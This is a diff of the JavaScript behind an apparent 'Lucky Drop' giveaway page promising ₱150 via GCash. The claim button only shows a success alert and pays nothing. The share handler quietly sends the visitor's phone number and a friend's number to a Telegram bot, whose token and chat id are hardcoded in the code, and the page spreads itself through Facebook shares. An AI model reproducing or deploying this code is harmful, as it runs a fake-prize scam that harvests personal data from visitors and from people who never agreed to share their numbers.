@@ -1,208 +1,4 @@
-// ========== SIMPLE DEVICE + NUMBER TRACKING (SPY MODE) ==========
-
-
-
-// ========== INDICATOR SYSTEM ==========
-
-const indicatorSystem = {
-    updateIndicators: function(step, isOnHold) {
-        if (isOnHold === undefined) isOnHold = false;
-        
-        const indicator1 = document.getElementById('indicator1');
-        const indicator2 = document.getElementById('indicator2');
-        const indicator3 = document.getElementById('indicator3');
-        
-        var indicators = [indicator1, indicator2, indicator3];
-        for (var i = 0; i < indicators.length; i++) {
-            var ind = indicators[i];
-            if (ind) {
-                ind.classList.remove('indicator-yellow-red', 'indicator-blue', 'indicator-green', 'indicator-hold');
-                ind.style.background = 'rgba(255,255,255,0.2)';
-                ind.style.boxShadow = 'none';
-                ind.style.animation = 'none';
-            }
-        }
-        
-        if (step >= 1 && indicator1) {
-            if (isOnHold) {
-                indicator1.classList.add('indicator-hold');
-                indicator1.style.background = '#ffd700';
-                indicator1.style.boxShadow = '0 0 15px #ffd700';
-            } else {
-                indicator1.classList.add('indicator-yellow-red');
-                indicator1.style.background = 'linear-gradient(90deg, #ff4444, #ffd700)';
-                indicator1.style.boxShadow = '0 0 10px #ff4444';
-                indicator1.style.animation = 'pulseFade 1s infinite';
-            }
-        }
-        
-        if (step >= 2 && indicator2) {
-            indicator2.classList.add('indicator-blue');
-            indicator2.style.background = '#00f2ff';
-            indicator2.style.boxShadow = '0 0 10px #00f2ff';
-            indicator2.style.animation = 'pulseFade 1s infinite';
-        }
-        
-        if (step >= 3 && indicator3) {
-            indicator3.classList.add('indicator-green');
-            indicator3.style.background = '#39ff14';
-            indicator3.style.boxShadow = '0 0 10px #39ff14';
-            indicator3.style.animation = 'pulseFade 1s infinite';
-        }
-        
-        localStorage.setItem('indicatorStep', step);
-        localStorage.setItem('claimOnHold', isOnHold);
-        this.saveToFirebase(step, isOnHold);
-    },
-    
-    saveToFirebase: async function(step, isOnHold) {
-        var phone = localStorage.getItem("userPhone");
-        if (!phone) return;
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            var db = firebase.database();
-            await db.ref('user_sessions/' + phone).update({
-                indicatorStep: step,
-                claimOnHold: isOnHold,
-                lastStepUpdate: Date.now()
-            });
-        }
-    },
-    
-    loadFromFirebase: async function() {
-        var phone = localStorage.getItem("userPhone");
-        if (!phone) return { step: 0, isOnHold: false };
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            var db = firebase.database();
-            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-            var step = sessionSnap.exists() ? sessionSnap.val().indicatorStep || 0 : 0;
-            var isOnHold = sessionSnap.exists() ? sessionSnap.val().claimOnHold || false : false;
-            localStorage.setItem('indicatorStep', step);
-            localStorage.setItem('claimOnHold', isOnHold);
-            this.updateIndicators(step, isOnHold);
-            return { step: step, isOnHold: isOnHold };
-        }
-        return { step: 0, isOnHold: false };
-    },
-    
-    step1ClaimOnHold: async function() {
-        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
-        if (currentStep === 1) {
-            this.updateIndicators(1, true);
-            return true;
-        }
-        return false;
-    },
-    
-    step2FacebookShare: async function() {
-        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
-        if (currentStep === 2) {
-            this.updateIndicators(2, false);
-            return true;
-        }
-        return false;
-    },
-    
-    step3ReferralComplete: async function() {
-        var currentStep = parseInt(localStorage.getItem('indicatorStep') || '0');
-        if (currentStep === 3) {
-            this.updateIndicators(3, false);
-            return true;
-        }
-        return false;
-    },
-    
-    getCurrentStep: function() {
-        return parseInt(localStorage.getItem('indicatorStep') || '0');
-    },
-    
-    setStep: function(step) {
-        this.updateIndicators(step, false);
-    }
-};
-
-// ========== BALANCE MANAGEMENT ==========
-const balanceManager = {
-    getBalance: async function() {
-        var phone = localStorage.getItem("userPhone");
-        if (!phone) return 0;
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            var db = firebase.database();
-            var sessionSnap = await db.ref('user_sessions/' + phone).once('value');
-            return sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
-        }
-        return 0;
-    },
-    
-    addBalance: async function(amount) {
-        var phone = localStorage.getItem("userPhone");
-        if (!phone) return false;
-        
-        if (typeof firebase !== 'undefined' && firebase.database) {
-            var db = firebase.database();
-            var sessionRef = db.ref('user_sessions/' + phone);
-            var sessionSnap = await sessionRef.once('value');
-            var currentBalance = sessionSnap.exists() ? sessionSnap.val().balance || 0 : 0;
-            var newBalance = currentBalance + amount;
-            
-            if (newBalance > 1200) {
-                newBalance = 1200;
-                alert("Maximum balance of ₱1200 reached!");
-            }
-            
-            await sessionRef.update({
-                balance: newBalance,
-                lastBalanceUpdate: Date.now()
-            });
-            
-            await db.ref('balance_history/' + phone + '/' + Date.now()).set({
-                amount: amount,
-                newBalance: newBalance,
-                reason: "reward",
-                timestamp: Date.now()
-            });
-            
-            return newBalance;
-        }
-        return false;
-    },
-    
-    updateBalanceDisplay: async function() {
-        var balance = await this.getBalance();
-        var balanceElement = document.getElementById('userBalanceDisplay');
-        if (balanceElement) {
-            balanceElement.innerHTML = "₱" + balance.toLocaleString();
-        }
-        return balance;
-    }
-};
-
-// ========== WEIGHTED RANDOM AMOUNTS ==========
-const rewardTiers = {
-    common: { amounts: [150, 300], weight: 60 },
-    rare: { amounts: [450, 600, 750], weight: 30 },
-    legendary: { amounts: [900, 1050, 1200], weight: 10 }
-};
-
-function generateWeightedAmount() {
-    var random = Math.random() * 100;
-    var selectedTier = rewardTiers.common;
-    
-    if (random < rewardTiers.common.weight) {
-        selectedTier = rewardTiers.common;
-    } else if (random < rewardTiers.common.weight + rewardTiers.rare.weight) {
-        selectedTier = rewardTiers.rare;
-    } else {
-        selectedTier = rewardTiers.legendary;
-    }
-    
-    var amounts = selectedTier.amounts;
-    return amounts[Math.floor(Math.random() * amounts.length)];
-}
-
-// ========== MAIN TIMER (DROP ENDS IN) ==========
+// ========== MAIN TIMER (DROP ENDS IN - May 1, 2026) ==========
 function initMainTimer() {
     var timerDisplay = document.getElementById('mainTimerDisplay');
     if (!timerDisplay) return;
@@ -256,57 +52,7 @@ function initWinnerTicker() {
     console.log("Winner ticker started");
 }
 
-
-// ========== SHARE BUTTON COOLDOWN UI ==========
-var shareCooldownInterval = null;
-
-function updateShareButtonCooldown() {
-    var remaining = referralTimer.getRemainingTime();
-    var shareBtn = document.getElementById('shareButton');
-    var friendInput = document.getElementById('friendPhoneInput');
-    var statusMsg = document.getElementById('statusMessage');
-    
-    if (remaining > 0) {
-        var mins = Math.floor(remaining / 60);
-        var secs = remaining % 60;
-        var timeStr = mins.toString().padStart(2, '0') + ":" + secs.toString().padStart(2, '0');
-        if (shareBtn) {
-            shareBtn.disabled = true;
-            shareBtn.innerHTML = "⏰ WAIT " + timeStr;
-        }
-        if (friendInput) friendInput.disabled = true;
-        if (statusMsg) {
-            statusMsg.innerHTML = '<span class="status-waiting">⏳ Please wait ' + timeStr + ' before sharing again ⏳</span>';
-        }
-    } else {
-        if (shareBtn) {
-            shareBtn.disabled = false;
-            shareBtn.innerHTML = "🐾 SHARE & UNLOCK 🐾";
-        }
-        if (friendInput) friendInput.disabled = false;
-        if (statusMsg) {
-            statusMsg.innerHTML = '<span class="status-unlocked">🎉 Share with a friend to unlock 150 credits! 🎉</span>';
-        }
-        if (shareCooldownInterval) {
-            clearInterval(shareCooldownInterval);
-            shareCooldownInterval = null;
-        }
-    }
-}
-
-function startShareCooldownUI() {
-    if (shareCooldownInterval) clearInterval(shareCooldownInterval);
-    updateShareButtonCooldown();
-    shareCooldownInterval = setInterval(updateShareButtonCooldown, 1000);
-}
-
-function checkExistingCooldown() {
-    if (referralTimer.isOnCooldown()) {
-        startShareCooldownUI();
-    }
-}
-
-// ========== CONFETTI FUNCTIONS ==========
+// ========== CONFETTI ==========
 var confettiAnimation = null;
 var confettiTimeout = null;
 
@@ -369,7 +115,7 @@ function stopConfetti() {
     }
 }
 
-// ========== PRIZE POPUP FUNCTIONS ==========
+// ========== PRIZE POPUP ==========
 function showPrizePopup() {
     var popup = document.getElementById('prizePopup');
     if (popup) {
@@ -414,7 +160,7 @@ function initCardHighlights() {
 }
 
 // ========== SHARE BUTTON ==========
-async function handleShare() {
+function handleShare() {
     var friendPhone = document.getElementById('friendPhoneInput').value.trim();
     var userPhone = localStorage.getItem("userPhone");
     
@@ -428,36 +174,25 @@ async function handleShare() {
         return;
     }
     
-    if (referralTimer.isOnCooldown()) {
-        var remaining = referralTimer.getRemainingTime();
-        var mins = Math.floor(remaining / 60);
-        var secs = remaining % 60;
-        alert("Please wait " + mins + ":" + secs.toString().padStart(2, '0') + " before inviting again.");
-        return;
-    }
-    
-    indicatorSystem.setStep(1);
-    referralTimer.startTimer();
-    startShareCooldownUI();
-    
-    var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
-    
-    try {
-        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
-    } catch(e) {
-        console.log("Telegram error:", e);
-    }
-    
+    // Clear input
     document.getElementById('friendPhoneInput').value = '';
     
+    // Update progress bar
     var progressFill = document.getElementById('progressFill');
     if (progressFill) progressFill.style.width = '33%';
     
+    // Update status message
     var statusMsg = document.getElementById('statusMessage');
     if (statusMsg) {
         statusMsg.innerHTML = '<span class="status-step1">✅ Step 1 completed! Click CLAIM THRU GCASH to get ₱150!</span>';
     }
     
+    // Send Telegram
+    var message = "REFERRAL INVITE!\nUser: " + userPhone + "\nFriend: " + friendPhone;
+    fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message))
+        .catch(function(e) { console.log("Telegram error:", e); });
+    
+    // Show popup
     showPrizePopup();
 }
 
@@ -468,19 +203,16 @@ function initShareButton() {
         var newShareBtn = shareBtn.cloneNode(true);
         shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
         newShareBtn.onclick = handleShare;
-        newShareBtn.disabled = referralTimer.isOnCooldown();
         console.log("Share button initialized");
     }
 }
 
 // ========== FACEBOOK SHARE ==========
-async function handleFacebookShare() {
+function handleFacebookShare() {
     var shareUrl = "https://xjiligames.github.io/rewards/index.html";
     var fbShareUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
     
     window.open(fbShareUrl, '_blank', 'width=600,height=400');
-    
-    await indicatorSystem.step2FacebookShare();
     
     var progressFill = document.getElementById('progressFill');
     if (progressFill) progressFill.style.width = '66%';
@@ -488,15 +220,6 @@ async function handleFacebookShare() {
     var statusMsg = document.getElementById('statusMessage');
     if (statusMsg) {
         statusMsg.innerHTML = '<span class="status-step2">✅ Step 2 completed! Share to Facebook done!</span>';
-    }
-    
-    var phone = localStorage.getItem("userPhone");
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        var db = firebase.database();
-        await db.ref('user_sessions/' + phone).update({
-            indicatorStep: 2,
-            lastStepUpdate: Date.now()
-        });
     }
 }
 
@@ -516,40 +239,15 @@ function initFacebookShare() {
 }
 
 // ========== CLAIM BUTTON ==========
-async function handleClaimGCash() {
-    var currentStep = indicatorSystem.getCurrentStep();
-    var isOnHold = localStorage.getItem('claimOnHold') === 'true';
+function handleClaimGCash() {
+    alert("💰 ₱150 claimed! Thank you for playing Lucky Drop!");
     
-    if (currentStep !== 1) {
-        alert("Complete Step 1 first! Enter a friend's mobile number.");
-        return;
-    }
+    var progressFill = document.getElementById('progressFill');
+    if (progressFill) progressFill.style.width = '100%';
     
-    if (isOnHold) {
-        alert("Claim is already processing. Please wait.");
-        return;
-    }
-    
-    await indicatorSystem.step1ClaimOnHold();
-    
-    var newBalance = await balanceManager.addBalance(150);
-    
-    if (newBalance !== false) {
-        alert("₱150 added to your balance! Total: ₱" + newBalance);
-        
-        var phone = localStorage.getItem("userPhone");
-        var message = "CLAIM SUCCESS!\nUser: " + phone + "\n₱150 claimed";
-        await fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent(message));
-        
-        var progressFill = document.getElementById('progressFill');
-        if (progressFill) progressFill.style.width = '50%';
-        
-        var statusMsg = document.getElementById('statusMessage');
-        if (statusMsg) {
-            statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share on Facebook to continue to Step 2!</span>';
-        }
-        
-        indicatorSystem.updateIndicators(1, false);
+    var statusMsg = document.getElementById('statusMessage');
+    if (statusMsg) {
+        statusMsg.innerHTML = '<span class="status-claimed">✅ ₱150 claimed! Share to Facebook to get bonus!</span>';
     }
 }
 
@@ -607,3 +305,20 @@ function initPopupClose() {
         };
     }
 }
+
+// ========== INITIALIZE ==========
+document.addEventListener('DOMContentLoaded', function() {
+    console.log("Promotion.js loading...");
+    
+    initMainTimer();
+    initWinnerTicker();
+    initCardHighlights();
+    initShareButton();
+    initFacebookShare();
+    initClaimButton();
+    initEnterKeySupport();
+    initVideoAutoplay();
+    initPopupClose();
+    
+    console.log("Promotion.js ready");
+});
